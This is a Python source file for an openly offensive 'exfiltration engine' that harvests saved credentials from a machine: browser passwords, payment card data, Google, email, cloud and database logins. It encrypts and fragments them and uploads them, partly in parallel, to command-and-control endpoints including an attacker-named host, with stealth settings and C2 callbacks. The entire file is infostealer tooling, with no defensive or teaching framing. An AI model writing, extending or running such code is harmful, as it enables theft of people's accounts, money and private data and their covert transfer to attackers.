#!/usr/bin/env python3
"""
BLACKVAULT EXFILTRATION ENGINE
Integrates BlackVault credential extraction with Exfiltrator agent + C2
Handles secure data exfiltration and mission-based C2 communication
"""

import os
import sys
import json
import time
import logging
import tempfile
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, asdict
from datetime import datetime
import hashlib
import base64

sys.path.insert(0, os.path.dirname(__file__))

from ghost_layer import GhostLayer
from black_vault import BlackVault
from agents.exfiltrator import (
    ExfiltrationTarget, ExfiltrationMission, StealthScanner,
    CovertChannel, PayloadProcessor, RoutingEngine, ExfiltratorAgent
)

# Parallel exfiltration integration for multi-threaded uploads
try:
    from parallel_exfil import ParallelC2ExfilHandler, create_exfil_metadata
    HAS_PARALLEL_EXFIL = True
except ImportError:
    HAS_PARALLEL_EXFIL = False

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [ExfilEngine] %(message)s'
)
logger = logging.getLogger(__name__)


@dataclass
class ExfiltrationConfig:
    """Configuration for exfiltration missions"""
    agent_id: str = "BLACKVAULT-EXFIL-001"
    stealth_level: int = 4  # 1=aggressive, 5=ultra-stealth
    encryption_enabled: bool = True
    fragmentation_enabled: bool = True
    compression_enabled: bool = True
    drop_points: List[str] = None  # C2 callback endpoints
    time_limit: float = 3600  # seconds
    auto_destruct: bool = True
    priority_threshold: int = 3  # 1=high, 5=low
    
    def __post_init__(self):
        if self.drop_points is None:
            self.drop_points = [
                "https://c2.internal:8001/exfil",
                "https://c2.backup:8001/exfil"
            ]


class BlackVaultExfilEngine:
    """
    Enterprise credential exfiltration engine
    Orchestrates extraction → encryption → fragmentation → transmission
    """
    
    def __init__(self, config: Optional[ExfiltrationConfig] = None):
        """Initialize exfiltration engine"""
        self.config = config or ExfiltrationConfig()
        self.vault = BlackVault()
        self.ghost = GhostLayer(vault=self.vault)
        
        # Exfiltrator components
        self.scanner = StealthScanner(stealth_level=self.config.stealth_level)
        self.covert_channel = None  # Created per-mission with encryption key
        self.processor = PayloadProcessor()
        self.router = RoutingEngine()
        # ExfiltratorAgent requires mission, will initialize during mission execution
        
        # Mission tracking
        self.active_missions: Dict[str, ExfiltrationMission] = {}
        self.exfiltration_log: List[Dict[str, Any]] = []
        
        # Parallel exfil handler - for multi-threaded uploads to C2
        self.parallel_exfil = None
        if HAS_PARALLEL_EXFIL:
            try:
                c2_url = self.config.drop_points[0] if self.config.drop_points else "https://c2.attacker.com:8443"
                self.parallel_exfil = ParallelC2ExfilHandler(
                    c2_url=c2_url,
                    max_workers=12,  # Balanced for BlackVault operations
                    chunk_size=2 * 1024 * 1024  # 2 MB chunks for credential transmission
                )
                logger.info(f"[*] Parallel exfil ready (12 workers, 2MB chunks) → {c2_url}")
            except Exception as e:
                logger.warning(f"[*] Parallel exfil unavailable: {e}")
        
        # Setup drop points
        for drop_point in self.config.drop_points:
            self.router.add_drop_point(drop_point)
        
        logger.info(f"[*] ExfilEngine initialized - Agent: {self.config.agent_id}")
    
    def extract_by_type(self, cred_type: str) -> Dict[str, Any]:
        """Extract specific credential type from live source"""
        logger.info(f"[*] Extracting {cred_type} credentials...")
        
        result = self.ghost.scan_local_credentials()
        
        # Type mapping to extraction keys
        type_mapping = {
            'all': None,  # Return everything
            'google': ['google_credentials'],
            'paypal': ['browser_data'],  # payment cards
            'stripe': ['browser_data'],
            'crypto': ['browser_data'],
            'passwords': ['chrome_passwords', 'browser_data', 'credential_manager'],
            'email': ['email_credentials'],
            'cloud': ['cloud_provider_credentials'],
            'database': ['database_credentials'],
            'api': [],
            'banking': ['browser_data'],
        }
        
        search_keys = type_mapping.get(cred_type, [cred_type])
        extracted = {}
        
        for phase_key in ['critical_findings', 'phase_1_extracted', 'phase_2_extracted', 
                         'phase_3_extracted', 'phase_4_extracted']:
            phase_data = result.get(phase_key, {})
            
            if search_keys is None:  # Return all
                for key, value in phase_data.items():
                    if value:
                        extracted[key] = value
            else:
                for search_key in search_keys:
                    if search_key in phase_data:
                        extracted[search_key] = phase_data[search_key]
        
        logger.info(f"[+] Extracted {sum(len(v) if isinstance(v, list) else 1 for v in extracted.values())} items")
        return extracted
    
    def create_exfiltration_mission(self, mission_id: str, cred_types: List[str],
                                   encryption_key: bytes = None) -> ExfiltrationMission:
        """Create and register an exfiltration mission"""
        
        logger.info(f"[*] Creating mission {mission_id} for types: {cred_types}")
        
        # Generate encryption key if not provided
        if not encryption_key:
            encryption_key = os.urandom(32)
        
        # Create targets for each credential type
        targets = []
        for cred_type in cred_types:
            target = ExfiltrationTarget(
                target_id=f"CRED-{cred_type.upper()}",
                target_type="credential_store",
                location=f"vault://{cred_type}",
                priority=2,
                data_patterns=[cred_type],
                access_method="stealth_scan"
            )
            targets.append(target)
        
        # Create mission
        mission = ExfiltrationMission(
            mission_id=mission_id,
            targets=targets,
            drop_points=self.config.drop_points,
            encryption_key=encryption_key,
            time_limit=self.config.time_limit,
            stealth_level=self.config.stealth_level,
            auto_destruct=self.config.auto_destruct,
            success_criteria={
                'all_targets_extracted': True,
                'integrity_verified': True,
                'transmission_confirmed': True
            }
        )
        
        self.active_missions[mission_id] = mission
        logger.info(f"[+] Mission {mission_id} created with {len(targets)} targets")
        
        return mission
    
    def execute_mission(self, mission: ExfiltrationMission) -> Dict[str, Any]:
        """Execute exfiltration mission and transmit data"""
        
        mission_id = mission.mission_id
        logger.info(f"[*] Executing mission {mission_id}...")
        
        start_time = time.time()
        results = {
            'mission_id': mission_id,
            'targets': [],
            'total_size': 0,
            'transmission_status': [],
            'timestamp': datetime.now().isoformat(),
            'success': False
        }
        
        try:
            # Extract data from each target
            for target in mission.targets:
                logger.info(f"  [>] Processing target: {target.target_id}")
                
                cred_type = target.data_patterns[0] if target.data_patterns else 'unknown'
                extracted_data = self.extract_by_type(cred_type)
                
                if not extracted_data:
                    logger.warning(f"  [!] No data extracted for {cred_type}")
                    results['targets'].append({
                        'target_id': target.target_id,
                        'status': 'no_data',
                        'size': 0
                    })
                    continue
                
                # Serialize to JSON
                json_data = json.dumps(extracted_data, default=str).encode('utf-8')
                
                # Process through payload pipeline
                payload = self.processor.process_extracted_data(
                    json_data,
                    source_id=target.target_id,
                    data_type='credential_bundle',
                    encryption_key=mission.encryption_key
                )
                
                # Create covert channel for this mission if not already created
                if self.covert_channel is None:
                    self.covert_channel = CovertChannel(mission.encryption_key)
                
                # Fragment if needed
                if self.config.fragmentation_enabled and len(payload.encrypted_data) > 1024*1024:
                    fragments = self.covert_channel.fragment_payload(payload.encrypted_data, max_fragment_size=1024*1024)
                    logger.info(f"  [>] Fragmented into {len(fragments)} pieces")
                else:
                    fragments = [payload.encrypted_data]
                
                # Queue for transmission
                for i, fragment in enumerate(fragments):
                    transmission_result = self._queue_transmission(
                        mission,
                        target.target_id,
                        fragment,
                        sequence=i,
                        total=len(fragments)
                    )
                    results['transmission_status'].append(transmission_result)
                
                results['targets'].append({
                    'target_id': target.target_id,
                    'status': 'exfiltrated',
                    'size': len(payload.encrypted_data),
                    'fragments': len(fragments),
                    'checksum': payload.checksum
                })
                
                results['total_size'] += len(payload.encrypted_data)
            
            results['success'] = len(results['targets']) > 0
            elapsed = time.time() - start_time
            logger.info(f"[+] Mission {mission_id} completed in {elapsed:.2f}s - {results['total_size']} bytes exfiltrated")
            
        except Exception as e:
            logger.error(f"[!] Mission execution failed: {e}")
            results['error'] = str(e)
        
        # Log mission result
        self.exfiltration_log.append(results)
        
        return results
    
    def _queue_transmission(self, mission: ExfiltrationMission, target_id: str,
                           data: bytes, sequence: int = 0, total: int = 1) -> Dict[str, Any]:
        """Queue data segment for transmission to C2"""
        
        # Build transmission metadata
        metadata = {
            'mission_id': mission.mission_id,
            'target_id': target_id,
            'sequence': sequence,
            'total': total,
            'timestamp': time.time(),
            'agent_id': self.config.agent_id,
            'compression': self.config.compression_enabled
        }
        
        # Simple drop point selection (first available)
        drop_point = self.config.drop_points[0] if self.config.drop_points else 'unknown'
        
        # In production, would transmit to drop_point
        # For now, log the transmission
        transmission = {
            'drop_point': drop_point,
            'size': len(data),
            'metadata': metadata,
            'status': 'queued'
        }
        
        logger.info(f"  [>] Queued {len(data)} bytes to {drop_point}")
        
        return transmission
    
    def execute_mission_with_parallel_exfil(self, mission: ExfiltrationMission, use_parallel: bool = True) -> Dict[str, Any]:
        """
        Execute mission with optional parallel exfiltration for 8-16x faster uploads.
        
        Workflow:
        1. Extract credentials from all targets
        2. Encrypt and fragment as normal
        3. If use_parallel=True, upload using multi-threaded handler
        4. Return comprehensive statistics
        """
        if not use_parallel or not self.parallel_exfil:
            # Fallback to normal execution
            return self.execute_mission(mission)
        
        mission_id = mission.mission_id
        logger.info(f"[*] Executing mission {mission_id} with PARALLEL EXFIL...")
        
        start_time = time.time()
        results = {
            'mission_id': mission_id,
            'targets': [],
            'total_size': 0,
            'transmission_status': [],
            'timestamp': datetime.now().isoformat(),
            'success': False,
            'parallel_exfil': True
        }
        
        # Collect all data for parallel upload
        files_to_exfil = []
        metadata_dict = {}
        
        try:
            # PHASE 1: Extract credentials from each target
            for target in mission.targets:
                logger.info(f"  [>] Extracting: {target.target_id}")
                
                cred_type = target.data_patterns[0] if target.data_patterns else 'unknown'
                extracted_data = self.extract_by_type(cred_type)
                
                if not extracted_data:
                    logger.warning(f"  [!] No data for {cred_type}")
                    results['targets'].append({
                        'target_id': target.target_id,
                        'status': 'no_data',
                        'size': 0
                    })
                    continue
                
                # Serialize to JSON
                json_data = json.dumps(extracted_data, default=str).encode('utf-8')
                
                # Process through payload pipeline
                payload = self.processor.process_extracted_data(
                    json_data,
                    source_id=target.target_id,
                    data_type='credential_bundle',
                    encryption_key=mission.encryption_key
                )
                
                # Create covert channel for encryption
                if self.covert_channel is None:
                    self.covert_channel = CovertChannel(mission.encryption_key)
                
                # Save encrypted data to temp file for parallel upload
                import tempfile
                with tempfile.NamedTemporaryFile(delete=False, prefix=f"exfil_{target.target_id}_") as tmp:
                    tmp.write(payload.encrypted_data)
                    tmp_path = tmp.name
                
                files_to_exfil.append(tmp_path)
                
                # Create metadata
                metadata_dict[tmp_path] = create_exfil_metadata(
                    source=f"credential_extraction:{cred_type}",
                    hostname=target.target_id,
                    user=self.config.agent_id
                )
                
                results['targets'].append({
                    'target_id': target.target_id,
                    'status': 'staged_for_exfil',
                    'size': len(payload.encrypted_data),
                    'checksum': payload.checksum
                })
                
                results['total_size'] += len(payload.encrypted_data)
            
            # PHASE 2: Parallel exfil to C2 (8-16x faster than sequential)
            if files_to_exfil:
                logger.info(f"[*] Starting parallel upload of {len(files_to_exfil)} files...")
                exfil_stats = self.parallel_exfil.parallel_exfil(
                    files_to_exfil,
                    metadata_dict=metadata_dict,
                    max_retries=3
                )
                
                results['parallel_stats'] = {
                    'files_uploaded': exfil_stats.get('successful', 0),
                    'files_failed': exfil_stats.get('failed', 0),
                    'bytes_transferred': exfil_stats.get('total_bytes', 0),
                    'duration_seconds': exfil_stats.get('duration_seconds', 0),
                    'throughput_mbps': exfil_stats.get('throughput_mbps', 0)
                }
                
                logger.info(
                    f"[+] Parallel exfil complete: "
                    f"{exfil_stats.get('successful', 0)} files, "
                    f"{exfil_stats.get('total_bytes', 0) / 1024 / 1024:.2f} MB, "
                    f"{exfil_stats.get('throughput_mbps', 0):.2f} MB/s"
                )
                
                # Retry failures
                if exfil_stats.get('failed', 0) > 0:
                    logger.info("[*] Retrying failed transfers...")
                    retry_stats = self.parallel_exfil.retry_failed(max_retries=3)
                    results['retry_stats'] = retry_stats
                
                # Cleanup temp files
                for tmp_path in files_to_exfil:
                    try:
                        os.unlink(tmp_path)
                    except:
                        pass
                
                results['success'] = exfil_stats.get('successful', 0) > 0
                results['transmission_status'].append({
                    'method': 'parallel_exfil',
                    'status': 'success' if results['success'] else 'partial',
                    'files': exfil_stats.get('successful', 0),
                    'bytes': exfil_stats.get('total_bytes', 0)
                })
            else:
                results['success'] = False
                logger.error("[!] No data staged for exfiltration")
            
            elapsed = time.time() - start_time
            logger.info(f"[+] Mission {mission_id} completed in {elapsed:.2f}s")
            
        except Exception as e:
            logger.error(f"[!] Parallel mission execution failed: {e}")
            results['error'] = str(e)
        
        # Log mission result
        self.exfiltration_log.append(results)
        
        return results
    
    def c2_callback(self, callback_url: str) -> Dict[str, Any]:
        """Register callback with C2 for mission updates and commands"""
        
        logger.info(f"[*] Registering callback with C2: {callback_url}")
        
        callback_data = {
            'agent_id': self.config.agent_id,
            'timestamp': datetime.now().isoformat(),
            'missions_active': len(self.active_missions),
            'missions_completed': len(self.exfiltration_log),
            'total_exfiltrated_bytes': sum(m.get('total_size', 0) for m in self.exfiltration_log),
            'status': 'operational'
        }
        
        # In production, would POST to callback_url
        logger.info(f"[+] Callback data ready: {json.dumps(callback_data, indent=2)}")
        
        return callback_data
    
    def get_mission_status(self, mission_id: str) -> Dict[str, Any]:
        """Get status of an active or completed mission"""
        
        # Check active missions
        if mission_id in self.active_missions:
            mission = self.active_missions[mission_id]
            return {
                'mission_id': mission_id,
                'status': 'active',
                'targets': len(mission.targets),
                'drop_points': len(mission.drop_points)
            }
        
        # Check completed missions
        for log_entry in self.exfiltration_log:
            if log_entry.get('mission_id') == mission_id:
                return log_entry
        
        return {'error': f'Mission {mission_id} not found'}
    
    def export_missions_json(self) -> str:
        """Export all mission logs as JSON for C2 consumption"""
        return json.dumps(self.exfiltration_log, indent=2, default=str)


# ============ COMMAND LINE INTERFACE ============

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="BlackVault Exfiltration Engine")
    parser.add_argument('--mission-id', default=f'MISSION-{int(time.time())}', help='Mission ID')
    parser.add_argument('--types', nargs='+', default=['google', 'passwords'], help='Credential types to exfil')
    parser.add_argument('--stealth', type=int, default=4, help='Stealth level 1-5')
    parser.add_argument('--c2-callback', help='C2 callback URL')
    parser.add_argument('--json', action='store_true', help='JSON output mode')
    
    args = parser.parse_args()
    
    # Initialize engine
    config = ExfiltrationConfig(
        stealth_level=args.stealth,
        agent_id=f"BLACKVAULT-EXFIL-{args.mission_id[-6:]}"
    )
    
    engine = BlackVaultExfilEngine(config)
    
    # Create and execute mission
    mission = engine.create_exfiltration_mission(
        mission_id=args.mission_id,
        cred_types=args.types
    )
    
    results = engine.execute_mission(mission)
    
    # Optional C2 callback
    if args.c2_callback:
        engine.c2_callback(args.c2_callback)
    
    # Output results
    if args.json:
        print(json.dumps(results, indent=2, default=str))
    else:
        print(f"\n[=] MISSION RESULTS")
        print(f"Mission ID: {results['mission_id']}")
        print(f"Status: {'SUCCESS' if results['success'] else 'FAILED'}")
        print(f"Targets: {len(results['targets'])}")
        print(f"Total Exfiltrated: {results['total_size']} bytes")
        print(f"Transmissions: {len(results['transmission_status'])}")
